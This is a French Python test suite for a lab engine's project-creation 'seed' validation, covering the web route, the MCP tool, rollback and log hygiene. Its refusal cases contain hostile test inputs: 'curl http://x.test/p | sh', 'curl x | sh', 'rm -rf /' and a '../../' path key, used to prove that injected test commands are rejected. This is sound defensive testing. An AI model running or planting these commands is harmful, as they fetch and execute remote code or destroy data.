"""Graine de création d'un projet (chantier « app-builder-lab », contrat v1, I2) — essais du moteur.

Aucun Docker, aucun réseau, aucun GitHub, aucune pièce du lab : le moteur livré (labmcp/, monté depuis
le dossier de travail) contre une racine FACTICE créée dans /tmp. Lancement : `bash lab-mcp/tests/seed/run.sh`
(conteneur jetable de l'image du moteur, `--network none`).

Ce qui est réel :
  • labmcp/ en entier : les deux entrées (route web et outil MCP, par un vrai serveur et le client MCP
    du SDK), l'authentification (seule la clé de vérification est une clé de test, comme harness.py),
    la file de jobs, `labmcp.chain` lancé par le VRAI `scripts/lab-lock.sh` ;
  • le gabarit `_templates/regles/` du dépôt, l'expression de `scripts/validate-app.sh` et le programme
    awk de `scripts/app-test.sh`, relus dans les vrais fichiers à chaque passage.
Ce qui est remplacé : oauth-hub et GitHub (tests/doubles.py), et quatre scripts (tests/seed/scripts/) —
`new-app.sh` rend les règles par les mêmes lignes `sed` que le vrai (vérifié ici) mais ne scaffolde rien.

    python /tests/test_seed.py                 tous les essais
    python /tests/test_seed.py --trace F       une création SANS graine, tracée dans F (run.sh la joue
                                               avec le code d'avant et le code courant, et compare)
"""
import asyncio
import glob
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import threading
import time
import unittest

import httpx
import uvicorn
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

TRACE_OUT = sys.argv[sys.argv.index("--trace") + 1] if "--trace" in sys.argv else ""
REAL_SCRIPTS = "/lab-scripts"      # scripts/ du dépôt, en lecture seule
REAL_RULES = "/lab-regles"         # _templates/regles/ du dépôt, en lecture seule
DOMAIN = "lab.test"
BASE = "http://127.0.0.1:8000"

# ── racine factice ───────────────────────────────────────────────────────────
ROOT = "/tmp/zz-seed-root"
shutil.rmtree(ROOT, ignore_errors=True)
os.makedirs(os.path.join(ROOT, "scripts", "lib"))
os.makedirs(os.path.join(ROOT, ".trace"))
os.makedirs(os.path.join(ROOT, "deploiement"))
for rel in ("lab-lock.sh", "lib/registry.sh", "lib/lock.sh"):                 # les VRAIS
    shutil.copy(os.path.join(REAL_SCRIPTS, rel), os.path.join(ROOT, "scripts", rel))
for name in os.listdir("/tests/seed/scripts"):                               # les doubles
    shutil.copy(os.path.join("/tests/seed/scripts", name), os.path.join(ROOT, "scripts", name))
shutil.copytree(REAL_RULES, os.path.join(ROOT, "_templates", "regles"))
with open(os.path.join(ROOT, ".devs"), "w") as fh:
    fh.write("devtest\nzzroot\n")
for name in (".owners", ".ports"):
    open(os.path.join(ROOT, name), "w").close()
CALLS = os.path.join(ROOT, ".trace", "calls.log")
open(CALLS, "w").close()
GH_LOG = "/tmp/gh-requests.log"
open(GH_LOG, "w").close()
os.environ.update(LAB_ROOT=ROOT, DOMAIN=DOMAIN, LAB_SUPERUSER="zzroot",
                  LAB_STATE_DIR=os.path.join(ROOT, ".lab-state"), LAB_WORK_DIR=os.path.join(ROOT, "work"),
                  OAUTH_HUB_INTERNAL_URL="http://127.0.0.1:9101", GITHUB_API_URL="http://127.0.0.1:9102",
                  GITHUB_WEB_URL="https://github.test", LAB_MCP_JOB_LOCK_TIMEOUT="30")

sys.path.insert(0, "/tests")
import doubles  # noqa: E402
from labmcp import auth, config  # noqa: E402
from labmcp.server import build  # noqa: E402

client = type(sys)("client")
exec(compile(open("/tests/client.py").read().replace("sys.exit(main())", ""), "/tests/client.py", "exec"),
     client.__dict__)

# ── serveur : le moteur livré, clé de vérification de test (comme harness.py) ─
_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
with open("/tmp/test-issuer-key.pem", "wb") as fh:
    fh.write(_key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                serialization.NoEncryption()))


class _TestKeys:
    class _K:
        key = _key.public_key()

    def get_signing_key_from_jwt(self, _token):
        return self._K


_orig_init = auth.Authenticator.__init__


def _patched_init(self, *args, **kwargs):
    _orig_init(self, *args, **kwargs)
    self._jwks = _TestKeys()


auth.Authenticator.__init__ = _patched_init

LOGGED: list[str] = []          # tout ce que le moteur écrit dans ses journaux (audit compris)


class _Keep(logging.Handler):
    def emit(self, record):
        LOGGED.append(self.format(record))


logging.getLogger().addHandler(_Keep())
logging.getLogger().setLevel(logging.INFO)
logging.getLogger("httpx").setLevel(logging.WARNING)
doubles.start()
_server = uvicorn.Server(uvicorn.Config(build(config.load()), host="127.0.0.1", port=8000,
                                        log_level="warning", access_log=False))
threading.Thread(target=_server.run, daemon=True).start()
for _ in range(100):
    try:
        if httpx.get(BASE + "/mcp/healthz", timeout=2).status_code == 200:
            break
    except httpx.HTTPError:
        time.sleep(0.1)
else:
    sys.exit("le serveur d'essai ne répond pas")


# ── outils ───────────────────────────────────────────────────────────────────
def web(method, path, body=None, *, raw=None, ascii_json=True):
    token = client.mint("devtest", DOMAIN, "lab-admin")
    content = raw if raw is not None else (None if body is None else
                                           json.dumps(body, ensure_ascii=ascii_json).encode("utf-8"))
    r = httpx.request(method, BASE + "/mcp/api" + path, content=content, timeout=120,
                      headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
    return r.status_code, r.json()


def mcp(tool, args):
    return asyncio.run(client.mcp_call(BASE, client.mint("devtest", DOMAIN, "lab-mcp"), tool, args))


def wait_job(job_id):
    for _ in range(600):
        status, job = web("GET", f"/jobs/{job_id}?tail=1000")
        assert status == 200, job
        if job["terminal"]:
            return job
        time.sleep(0.1)
    raise AssertionError("job jamais terminé")


def read(path):
    with open(path, encoding="utf-8", newline="") as fh:
        return fh.read()


def steps_of(job):
    return [m.group(1) for line in job["log"] for m in [re.search(r"étape « ([a-z0-9_]+) »", line)] if m]


def git(app, *args):
    return subprocess.run(["git", "-C", os.path.join(ROOT, "deploiement", app), *args],
                          capture_output=True, text=True, check=True).stdout


def body_of(name, **more):
    return {"name": name, "type": "django-angular", "visibility": "private",
            "required_groups": ["developers"], **more}


def render_template(app, test_command="python manage.py test"):
    """Ce que new-app.sh écrit dans FEUILLE_DE_ROUTE.md (mêmes trois substitutions)."""
    text = read(os.path.join(ROOT, "_templates", "regles", "FEUILLE_DE_ROUTE.md"))
    return (text.replace("__APP_NAME__", app).replace("__TEST_COMMAND__", test_command)
            .replace("__DATE__", time.strftime("%Y-%m-%d")))


class Sampler:
    """Relève les arguments de TOUS les processus du conteneur, toutes les 10 ms."""

    def __init__(self):
        self.seen: set[str] = set()
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def _run(self):
        while not self._stop.is_set():
            for path in glob.glob("/proc/[0-9]*/cmdline"):
                try:
                    with open(path, "rb") as fh:
                        self.seen.add(fh.read().replace(b"\0", b" ").decode("utf-8", "replace").strip())
                except OSError:
                    pass
            time.sleep(0.01)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *exc):
        self._stop.set()
        self._thread.join()


def create_plain(name):
    """Une création SANS graine, par la route web, et tout ce qu'on peut en observer."""
    calls_before, gh_before = len(read(CALLS)), len(read(GH_LOG))
    with Sampler() as sampler:
        status, started = web("POST", "/projects", body_of(name))
        assert status == 200, started
        job = wait_job(started["job_id"])
    tree = git(name, "ls-tree", "-r", "HEAD") if job["state"] == "succeeded" else ""
    return {
        "reponse": {k: v for k, v in started.items() if k != "job_id"},
        "etat": job["state"], "etape": job["step"], "etapes": steps_of(job), "journal": job["log"],
        "resultat": job["result"],
        "chaine": sorted(c for c in sampler.seen if "labmcp.chain" in c and c.startswith("/")),
        "scripts": read(CALLS)[calls_before:], "github": read(GH_LOG)[gh_before:],
        "premier_commit": tree,
        "feuille_de_route": read(os.path.join(ROOT, "deploiement", name, "FEUILLE_DE_ROUTE.md")),
        "fichiers": sorted(os.listdir(os.path.join(ROOT, "deploiement", name))),
    }


def normalise(obj):
    """Retire ce qui change d'un passage à l'autre (SHA du commit, qui porte l'heure ; clé tirée au
    hasard). Les empreintes des FICHIERS du premier commit, elles, sont gardées : elles doivent être égales."""
    commit = (obj.get("resultat") or {}).get("sha") or "(aucun)"
    text = json.dumps(obj, ensure_ascii=False, indent=1, sort_keys=True).replace(commit, "<sha du commit>")
    text = re.sub(r"ssh-ed25519 [A-Za-z0-9+/=]+", "ssh-ed25519 <clé>", text)
    return re.sub(r"pid=[0-9]+ depuis [0-9: -]+", "pid=<n> depuis <date>", text)


if TRACE_OUT:
    with open(TRACE_OUT, "w", encoding="utf-8") as out:
        out.write(normalise(create_plain("zzplain")) + "\n")
    print(f"trace écrite : {TRACE_OUT}")
    sys.exit(0)

# ═════════════════════════════════════════════════════════════════════════════
from labmcp import seed as seed_rules  # noqa: E402  (absent du code d'avant : après le mode --trace)

MARK_L = "GRAINE-LOTS-7f3a91"
MARK_C = "GRAINE-CAHIER-c41d08"
MARKS = (MARK_L, MARK_C)


def title(n, status="à faire", text=None):
    return f"## Lot {n} — {text or f'Lot métier {MARK_L} {n}'}   ·   statut : {status}"


def lots(count=3, start=2, status="à faire"):
    out = []
    for n in range(start, start + count):
        out += [title(n, status), f"**Objectif :** objectif {MARK_L}", "**Tâches :**", "- [ ] une tâche",
                "**Tests à passer avant de clore le lot :**", "- [ ] `python manage.py test api.tests.Un` passe",
                "**Vérifié le :**", ""]
    return "\n".join(out)


CAHIER = (f"# Cahier des charges — Gestion de stock\n\n{MARK_C}\n\n## Modèles\n\n# un titre libre est permis ici\n\n"
          "Spécification App Builder n° 12, état du 2026-10-13T09:20:11+02:00.\n")
GOOD = {"lots_md": lots(), "cahier_des_charges_md": CAHIER}


def seed(**over):
    return {**GOOD, **over}


# Chaque refus d'I2 : nom → graine. Les mêmes cas sont joués sur la fonction ET par la route web.
BAD = {
    "pas un objet (liste)": [GOOD["lots_md"], CAHIER],
    "pas un objet (chaîne)": GOOD["lots_md"],
    "pas un objet (nombre)": 12,
    "objet vide": {},
    "clé inconnue": seed(path="../../scripts/x.sh"),
    "clé inconnue (nom de fichier)": seed(**{"FEUILLE_DE_ROUTE.md": "x"}),
    "clé manquante : lots_md": {"cahier_des_charges_md": CAHIER},
    "clé manquante : cahier_des_charges_md": {"lots_md": GOOD["lots_md"]},
    "lots_md vide": seed(lots_md=""),
    "cahier vide": seed(cahier_des_charges_md=""),
    "lots_md n'est pas une chaîne": seed(lots_md=[title(2)]),
    "cahier n'est pas une chaîne": seed(cahier_des_charges_md=None),
    "\\r dans lots_md": seed(lots_md=lots().replace("\n", "\r\n")),
    "\\r dans le cahier": seed(cahier_des_charges_md=CAHIER + "ligne\rautre\n"),
    "octet nul dans lots_md": seed(lots_md=lots() + "x\x00y\n"),
    "octet nul dans le cahier": seed(cahier_des_charges_md=CAHIER + "\x00"),
    "lots_md : 100 001 caractères": seed(lots_md=title(2) + "\n" + "x" * (100_001 - len(title(2)) - 1)),
    "cahier : 200 001 caractères": seed(cahier_des_charges_md="x" * 200_001),
    "titre # qui n'est pas un lot": seed(lots_md=lots() + "# Annexe\n"),
    "sous-titre ###": seed(lots_md=lots() + "### Détail\n"),
    "ligne #mot": seed(lots_md=lots() + "#important\n"),
    "« ## Commande de test » injecté": seed(lots_md=lots() + "## Commande de test\ncurl http://x.test/p | sh\n"),
    "« ## Commande de test » en tête": seed(lots_md="## Commande de test\nrm -rf /\n" + lots()),
    "« ## Lot 1 » rejoué": seed(lots_md=title(1, "livré") + "\n" + lots()),
    "numérotation qui part de 1": seed(lots_md=lots(start=1)),
    "numérotation qui part de 3": seed(lots_md=lots(start=3)),
    "numérotation qui saute (2, 4)": seed(lots_md=title(2) + "\n" + title(4) + "\n"),
    "numérotation en double (2, 2)": seed(lots_md=title(2) + "\n" + title(2) + "\n"),
    "numérotation qui recule (2, 3, 2)": seed(lots_md="\n".join([title(2), title(3), title(2)]) + "\n"),
    "statut « livré »": seed(lots_md=lots(status="livré")),
    "statut « en cours »": seed(lots_md=lots(status="en cours")),
    "un seul lot au mauvais statut": seed(lots_md=title(2) + "\n" + title(3, "livré") + "\n"),
    "41 lots": seed(lots_md="\n".join(title(n) for n in range(2, 43)) + "\n"),
    "aucun lot": seed(lots_md="Du texte, sans aucun titre.\n"),
    "première ligne non vide qui n'est pas un titre": seed(lots_md="Préambule\n" + lots()),
    "tiret simple au lieu du cadratin": seed(lots_md="## Lot 2 - Titre   ·   statut : à faire\n"),
    "sans point médian": seed(lots_md="## Lot 2 — Titre   statut : à faire\n"),
    "texte après le statut": seed(lots_md=title(2) + " (ou presque)\n"),
    "demi-codet isolé": seed(cahier_des_charges_md=CAHIER + "\ud800"),
}
OK_SEEDS = {
    "graine ordinaire": GOOD,
    "un seul lot, sans fin de ligne": seed(lots_md=title(2)),
    "40 lots": seed(lots_md="\n".join(title(n) for n in range(2, 42)) + "\n"),
    "lignes vides avant le premier titre": seed(lots_md="\n   \n" + lots()),
    "espaces après le statut": seed(lots_md=title(2) + " \t \n"),
    "zéros de tête": seed(lots_md="## Lot 02 — A   ·   statut : à faire\n## Lot 003 — B · statut : à faire\n"),
    "lots_md : 100 000 caractères exactement": seed(lots_md=title(2) + "\n" + "é" * (100_000 - len(title(2)) - 1)),
    "cahier : 200 000 caractères exactement": seed(cahier_des_charges_md="é" * 200_000),
    "cahier sans structure": seed(cahier_des_charges_md="## Commande de test\n# n'importe quoi\n"),
    "dièse qui n'ouvre pas la ligne": seed(lots_md=title(2) + "\nvoir le ticket #12\n- [ ] `# commentaire`\n"),
}


def real_gate_expression():
    """L'expression de la porte « feuille-de-route », lue dans le vrai scripts/validate-app.sh."""
    found = re.search(r"grep -qE '(\^## Lot \[0-9\]\+ [^']+)' \"\$fdr\"", read(os.path.join(REAL_SCRIPTS, "validate-app.sh")))
    assert found, "expression de validate-app.sh introuvable : le script a changé, revoir cet essai"
    return found.group(1)


def real_test_command(roadmap_path):
    """La commande de test que le lab exécuterait : le programme awk du vrai scripts/app-test.sh."""
    found = re.search(r"TEST_CMD=\"\$\(awk '\n(.*?)' \"\$APP_DIR/FEUILLE_DE_ROUTE\.md\"\)\"",
                      read(os.path.join(REAL_SCRIPTS, "app-test.sh")), re.S)
    assert found, "programme awk d'app-test.sh introuvable : le script a changé, revoir cet essai"
    return subprocess.run(["awk", found.group(1), roadmap_path], capture_output=True, text=True, check=True).stdout.strip()


def passes_gate(path):
    return subprocess.run(["grep", "-qE", real_gate_expression(), path]).returncode == 0


def no_mark(testcase, what, label):
    text = what if isinstance(what, str) else json.dumps(what, ensure_ascii=False)
    for mark in MARKS:
        testcase.assertNotIn(mark, text, f"contenu de la graine retrouvé dans : {label}")


# ═════════════════════════════════════════════════════════════════════════════
class T1_Validation(unittest.TestCase):
    """labmcp/seed.py — règles de validation d'I2, sur la fonction."""

    def test_graines_recevables(self):
        for label, value in OK_SEEDS.items():
            with self.subTest(label):
                self.assertEqual(seed_rules.validate(value), [])

    def test_chaque_refus(self):
        for label, value in BAD.items():
            with self.subTest(label):
                reasons = seed_rules.validate(value)
                self.assertTrue(reasons, "aurait dû être refusée")
                self.assertTrue(all(isinstance(r, str) and r.startswith("seed") for r in reasons), reasons)
                no_mark(self, reasons, f"raisons du refus « {label} »")
                self.assertLessEqual(len(reasons), seed_rules.MAX_REASONS + 3)

    def test_raisons_attendues(self):
        expect = {
            "clé inconnue": "clé(s) non admise(s)", "clé manquante : lots_md": "seed.lots_md : champ manquant",
            "clé manquante : cahier_des_charges_md": "seed.cahier_des_charges_md : champ manquant",
            "\\r dans lots_md": "retour chariot", "octet nul dans le cahier": "octet nul",
            "lots_md : 100 001 caractères": "100001 caractères, 100000 au plus",
            "cahier : 200 001 caractères": "200001 caractères, 200000 au plus",
            "titre # qui n'est pas un lot": "doit être un titre de lot",
            "« ## Commande de test » injecté": "doit être un titre de lot",
            "numérotation qui part de 1": "le lot attendu ici est le Lot 2",
            "numérotation qui saute (2, 4)": "le lot attendu ici est le Lot 3",
            "statut « livré »": "aucun autre statut", "41 lots": "41 lots, 40 au plus",
            "aucun lot": "aucun lot", "première ligne non vide qui n'est pas un titre": "première ligne non vide",
        }
        for label, fragment in expect.items():
            with self.subTest(label):
                self.assertIn(fragment, " | ".join(seed_rules.validate(BAD[label])))

    def test_numero_demesure_sans_cout(self):
        huge = "## Lot " + "9" * 90_000 + " — T   ·   statut : à faire\n"
        t0 = time.time()
        self.assertTrue(seed_rules.validate(seed(lots_md=huge)))
        self.assertLess(time.time() - t0, 2)

    def test_lignes_coupees_comme_grep_et_awk(self):
        """Seul « \\n » sépare les lignes : un titre derrière U+2028, U+0085 ou \\v n'ouvre pas de ligne
        pour grep/awk ; il n'est donc pas un titre, et la graine reste recevable."""
        for sep in (" ", "\u0085", "\v", "\f", "\x1c"):
            with self.subTest(repr(sep)):
                self.assertEqual(seed_rules.validate(seed(lots_md=title(2) + "\nfin" + sep + "## Commande de test\n")), [])


class T2_Ecriture(unittest.TestCase):
    """labmcp/seed.py — écriture dans une copie fidèle du gabarit rendu."""

    def setUp(self):
        self.dir = os.path.join("/tmp", "zz-seed-apply")
        shutil.rmtree(self.dir, ignore_errors=True)
        os.makedirs(self.dir)
        self.roadmap = os.path.join(self.dir, "FEUILLE_DE_ROUTE.md")
        self.cahier = os.path.join(self.dir, "CAHIER_DES_CHARGES.md")
        self.before = render_template("gestion-stock")
        with open(self.roadmap, "w", encoding="utf-8") as fh:
            fh.write(self.before)

    def test_gabarit_du_lab_tel_qu_attendu(self):
        self.assertIn("\n## Commande de test\npython manage.py test\n", self.before)
        self.assertIn("\n## Lot 1 — Socle livré par le gabarit   ·   statut : livré\n", self.before)
        self.assertEqual(self.before.count("\n## Lot 2 — "), 1)
        self.assertTrue(passes_gate(self.roadmap))

    def test_feuille_de_route_et_cahier(self):
        done = seed_rules.apply(self.dir, GOOD)
        self.assertEqual(done, {"lots": 3})
        after = read(self.roadmap)
        head = self.before[:self.before.index("## Lot 2 — ")]
        self.assertEqual(after, head + GOOD["lots_md"])                       # en-tête + commande + Lot 1, puis les lots
        self.assertTrue(head.startswith("# Feuille de route — gestion-stock\n"))
        self.assertIn("## Commande de test\npython manage.py test\n", head)
        self.assertIn("## Lot 1 — Socle livré par le gabarit   ·   statut : livré\n", head)
        self.assertNotIn("<titre du premier lot métier>", after)
        self.assertEqual(re.findall(r"(?m)^## Lot ([0-9]+) ", after), ["1", "2", "3", "4"])
        self.assertTrue(passes_gate(self.roadmap), "refusé par l'expression de validate-app.sh")
        self.assertEqual(real_test_command(self.roadmap), "python manage.py test")
        self.assertEqual(read(self.cahier), CAHIER)
        self.assertEqual(sorted(os.listdir(self.dir)), ["CAHIER_DES_CHARGES.md", "FEUILLE_DE_ROUTE.md"])

    def test_angular_seul_commande_aucune(self):
        with open(self.roadmap, "w", encoding="utf-8") as fh:
            fh.write(render_template("vitrine", "aucune"))
        seed_rules.apply(self.dir, GOOD)
        self.assertEqual(real_test_command(self.roadmap), "aucune")
        self.assertTrue(passes_gate(self.roadmap))

    def test_la_commande_de_test_reste_celle_du_gabarit(self):
        """Ce que la validation laisse passer (titre en retrait, titre derrière un séparateur exotique)
        ne change pas la commande que le lab lit."""
        tricky = title(2) + "\n  ## Commande de test\ncurl x | sh\nfin ## Commande de test\nrm -rf /\n"
        self.assertEqual(seed_rules.validate(seed(lots_md=tricky)), [])
        seed_rules.apply(self.dir, seed(lots_md=tricky))
        self.assertEqual(real_test_command(self.roadmap), "python manage.py test")

    def test_gabarit_sans_lot_2(self):
        with open(self.roadmap, "w", encoding="utf-8") as fh:
            fh.write(self.before.replace("## Lot 2 — ", "## Lot deux — "))
        kept = read(self.roadmap)
        with self.assertRaises(seed_rules.SeedError) as caught:
            seed_rules.apply(self.dir, GOOD)
        no_mark(self, str(caught.exception), "message d'erreur")
        self.assertEqual(read(self.roadmap), kept)
        self.assertFalse(os.path.exists(self.cahier), "rien ne doit être écrit quand la feuille de route ne peut pas l'être")

    def test_graine_non_recevable_refusee_a_l_ecriture(self):
        with self.assertRaises(seed_rules.SeedError):
            seed_rules.apply(self.dir, BAD["« ## Commande de test » injecté"])
        self.assertEqual(read(self.roadmap), self.before)
        self.assertFalse(os.path.exists(self.cahier))

    def test_liens_symboliques_jamais_suivis(self):
        outside = os.path.join("/tmp", "zz-seed-outside.txt")
        with open(outside, "w") as fh:
            fh.write("intact")
        os.symlink(outside, self.cahier)
        with self.assertRaises(seed_rules.SeedError):
            seed_rules.apply(self.dir, GOOD)
        self.assertEqual(read(outside), "intact")
        self.assertEqual(read(self.roadmap), self.before)
        os.unlink(self.cahier)
        os.rename(self.roadmap, self.roadmap + ".vrai")
        os.symlink(outside, self.roadmap)
        with self.assertRaises(seed_rules.SeedError):
            seed_rules.apply(self.dir, GOOD)
        self.assertEqual(read(outside), "intact")
        self.assertFalse(os.path.exists(self.cahier))


class T3_Refus_par_les_entrees(unittest.TestCase):
    """`POST /projects` et `create_app` : refus immédiat `400 invalid` avec `reasons`, avant toute création."""

    def test_chaque_refus_par_la_route_web(self):
        calls, gh, jobs = read(CALLS), read(GH_LOG), len(glob.glob("/tmp/lab-mcp-seed-*"))
        for label, value in BAD.items():
            with self.subTest(label):
                status, data = web("POST", "/projects", body_of("zzrefus", seed=value))
                self.assertEqual((status, data.get("error")), (400, "invalid"), data)
                self.assertEqual(data["reasons"], seed_rules.validate(value))
                self.assertNotIn("job_id", data)
                no_mark(self, data, f"réponse au refus « {label} »")
        self.assertEqual(read(CALLS), calls, "un script a été lancé malgré le refus")
        self.assertEqual(read(GH_LOG), gh, "GitHub a été appelé malgré le refus")
        self.assertEqual(len(glob.glob("/tmp/lab-mcp-seed-*")), jobs)
        self.assertFalse(os.path.exists(os.path.join(ROOT, "deploiement", "zzrefus")))
        status, data = web("GET", "/projects")
        self.assertEqual((status, data["count"]), (200, 0))

    def test_meme_refus_par_l_outil_mcp(self):
        for label in ("clé inconnue", "clé manquante : lots_md", "\\r dans lots_md", "« ## Commande de test » injecté",
                      "numérotation qui saute (2, 4)", "statut « livré »", "41 lots", "objet vide"):
            with self.subTest(label):
                ws, wd = web("POST", "/projects", body_of("zzrefus", seed=BAD[label]))
                ms, md = mcp("create_app", body_of("zzrefus", seed=BAD[label]))
                self.assertEqual((ws, ms), (400, -1))
                self.assertEqual(wd, md, "les deux entrées ne rendent pas le même refus")

    def test_refus_ne_laisse_rien_au_journal(self):
        before = len(LOGGED)
        web("POST", "/projects", body_of("zzrefus", seed=BAD["« ## Commande de test » injecté"]))
        lines = LOGGED[before:]
        self.assertTrue(any('"op": "create_project"' in ln and '"result": "refused"' in ln for ln in lines), lines)
        no_mark(self, "\n".join(lines), "journal d'audit")
        self.assertNotIn("curl", "\n".join(lines))

    def test_corps_trop_gros(self):
        status, data = web("POST", "/projects", raw=b'{"name": "zzgros", "x": "' + b"a" * (4 * 1024 * 1024) + b'"}')
        self.assertEqual((status, data.get("error")), (400, "invalid"))
        status, data = web("POST", "/projects/check-name", raw=b'{"name": "zzgros", "x": "' + b"a" * (300 * 1024) + b'"}')
        self.assertEqual((status, data.get("error")), (400, "invalid"), "le plafond de 256 Ko des autres routes a bougé")


class T4_Chaine(unittest.TestCase):
    """Créations menées à leur terme : serveur → file de jobs → lab-lock.sh → labmcp.chain."""

    def test_1_sans_graine_rien_ne_change(self):
        t = create_plain("zzsans")
        self.assertEqual(t["etat"], "succeeded", t["journal"])
        self.assertEqual(t["etapes"], ["check_name", "repo_check", "repo_create", "scaffold", "register", "deploy_key", "webhook"])
        self.assertEqual(t["chaine"], [f"{sys.executable} -m labmcp.chain create devtest zzsans 4 private developers"])
        self.assertEqual(t["feuille_de_route"], render_template("zzsans"), "la feuille de route n'est plus celle du gabarit")
        self.assertNotIn("CAHIER_DES_CHARGES.md", t["fichiers"])
        self.assertNotIn("CAHIER_DES_CHARGES.md", t["premier_commit"])
        self.assertNotIn("LAB_MCP_SEED_FILE", read(os.path.join(ROOT, ".trace", "environ-new-app-zzsans.txt")))
        self.assertEqual(sorted(t["resultat"]), ["app", "auto_deploy_available", "exit_code", "ok", "ports", "repo_url", "sha", "step"])

    def test_1b_seed_null_vaut_absent(self):
        status, started = web("POST", "/projects", body_of("zznull", seed=None))
        self.assertEqual(status, 200, started)
        job = wait_job(started["job_id"])
        self.assertEqual(job["state"], "succeeded")
        self.assertNotIn("seed", steps_of(job))
        self.assertEqual(read(os.path.join(ROOT, "deploiement", "zznull", "FEUILLE_DE_ROUTE.md")), render_template("zznull"))

    def _with_seed(self, name, via):
        before_log = len(LOGGED)
        with Sampler() as sampler:
            if via == "web":
                status, started = web("POST", "/projects", body_of(name, seed=GOOD))
            else:
                status, started = mcp("create_app", body_of(name, seed=GOOD))
            self.assertEqual(status, 200, started)
            job = wait_job(started["job_id"])
        self.assertEqual(job["state"], "succeeded", job["log"])
        self.assertEqual(steps_of(job), ["check_name", "repo_check", "repo_create", "scaffold", "seed", "register",
                                         "deploy_key", "webhook"])
        # dans le PREMIER commit, avec le contenu attendu
        self.assertEqual(git(name, "rev-list", "--count", "HEAD").strip(), "1")
        files = git(name, "ls-tree", "-r", "--name-only", "HEAD").split()
        self.assertIn("FEUILLE_DE_ROUTE.md", files)
        self.assertIn("CAHIER_DES_CHARGES.md", files)
        self.assertEqual(git(name, "status", "--porcelain"), "")
        rendered = render_template(name)
        self.assertEqual(git(name, "show", "HEAD:FEUILLE_DE_ROUTE.md"),
                         rendered[:rendered.index("## Lot 2 — ")] + GOOD["lots_md"])
        self.assertEqual(git(name, "show", "HEAD:CAHIER_DES_CHARGES.md"), CAHIER)
        roadmap = os.path.join(ROOT, "deploiement", name, "FEUILLE_DE_ROUTE.md")
        self.assertTrue(passes_gate(roadmap))
        self.assertEqual(real_test_command(roadmap), "python manage.py test")
        # (e) le contenu de la graine n'est nulle part ailleurs que dans les deux fichiers
        chain = [c for c in sampler.seen if "labmcp.chain" in c]
        self.assertIn(f"{sys.executable} -m labmcp.chain create devtest {name} 4 private developers", chain)
        no_mark(self, "\n".join(sorted(sampler.seen)), "arguments des processus (relevé toutes les 10 ms)")
        trace = os.path.join(ROOT, ".trace")
        for kind in ("ps-new-app", "environ-new-app", "env-new-app", "ps-register", "env-register"):
            content = read(os.path.join(trace, f"{kind}-{name}.txt"))
            self.assertTrue(content.strip(), kind)
            no_mark(self, content, f"{kind} (relevé par le script lancé par la chaîne)")
        self.assertIn("labmcp.chain create", read(os.path.join(trace, f"ps-new-app-{name}.txt")))
        environ = read(os.path.join(trace, f"environ-new-app-{name}.txt"))
        self.assertIn("LAB_MCP_SEED_FILE=/tmp/lab-mcp-seed-", environ)        # le CHEMIN, hérité par lab-lock.sh
        self.assertNotIn("LAB_MCP_SEED_FILE", read(os.path.join(trace, f"env-new-app-{name}.txt")))   # pas transmis aux scripts
        self.assertEqual(read(os.path.join(trace, f"seedfiles-new-app-{name}.txt")), "", "le fichier de graine existait encore")
        self.assertEqual(glob.glob("/tmp/lab-mcp-seed-*"), [])
        status, full = web("GET", f"/jobs/{started['job_id']}?tail=1000")
        self.assertEqual(full["log_lines_total"], len(full["log"]))            # le journal ENTIER est sous les yeux
        no_mark(self, full, "journal et résultat du job")
        no_mark(self, "\n".join(LOGGED[before_log:]), "journaux du moteur (audit compris)")
        no_mark(self, read(CALLS), "arguments et entrée standard des scripts")
        no_mark(self, read(GH_LOG), "requêtes à GitHub")
        return job

    def test_2_avec_graine_par_la_route_web(self):
        job = self._with_seed("zzgraine", "web")
        self.assertTrue(any("3 lot(s) métier" in line for line in job["log"]))

    def test_3_avec_graine_par_l_outil_mcp(self):
        self._with_seed("zzgrainemcp", "mcp")

    def test_4_graine_aux_tailles_maximales(self):
        """300 000 caractères accentués : le corps dépasse l'ancien plafond de 256 Ko de l'entrée web."""
        big = seed(lots_md=title(2) + "\n" + "é" * (100_000 - len(title(2)) - 1), cahier_des_charges_md="é" * 200_000)
        raw = json.dumps(body_of("zzmax", seed=big), ensure_ascii=False).encode("utf-8")
        self.assertGreater(len(raw), 256 * 1024)
        status, started = web("POST", "/projects", raw=raw)
        self.assertEqual(status, 200, started)
        self.assertEqual(wait_job(started["job_id"])["state"], "succeeded")
        self.assertEqual(len(git("zzmax", "show", "HEAD:CAHIER_DES_CHARGES.md")), 200_000)
        raw = json.dumps(body_of("zzmaxascii", seed=big)).encode("utf-8")           # tout échappé en \\u00e9
        self.assertGreater(len(raw), 1_500_000)
        status, started = web("POST", "/projects", raw=raw)
        self.assertEqual(status, 200, started)
        self.assertEqual(wait_job(started["job_id"])["state"], "succeeded")

    def test_5_gabarit_sans_lot_2_retour_arriere(self):
        template = os.path.join(ROOT, "_templates", "regles", "FEUILLE_DE_ROUTE.md")
        original = read(template)
        with open(template, "w", encoding="utf-8") as fh:
            fh.write(original.replace("## Lot 2 — ", "## Lot deux — "))
        calls, gh = len(read(CALLS)), len(read(GH_LOG))
        try:
            status, started = web("POST", "/projects", body_of("zzcasse", seed=GOOD))
            self.assertEqual(status, 200, started)
            job = wait_job(started["job_id"])
        finally:
            with open(template, "w", encoding="utf-8") as fh:
                fh.write(original)
        self.assertEqual((job["state"], job["step"]), ("failed", "seed"), job["log"])
        self.assertEqual(steps_of(job), ["check_name", "repo_check", "repo_create", "scaffold", "seed"])
        result = job["result"]
        self.assertEqual((result["ok"], result["step"], result["rollback_complete"]), (False, "seed", True), result)
        self.assertIn("dossier, lignes de registre et schéma retirés", result["rollback"])
        self.assertIn("dépôt GitHub devtest-gh/zzcasse supprimé", result["rollback"])
        self.assertFalse(os.path.exists(os.path.join(ROOT, "deploiement", "zzcasse")))
        self.assertNotIn("zzcasse", read(os.path.join(ROOT, ".owners")) + read(os.path.join(ROOT, ".ports")))
        state = os.path.join(ROOT, ".lab-state")
        self.assertFalse(os.path.exists(os.path.join(state, "deploy-keys", "zzcasse")))
        self.assertFalse(os.path.exists(os.path.join(state, "auto-deploy", "zzcasse.json")))
        scripts = read(CALLS)[calls:]
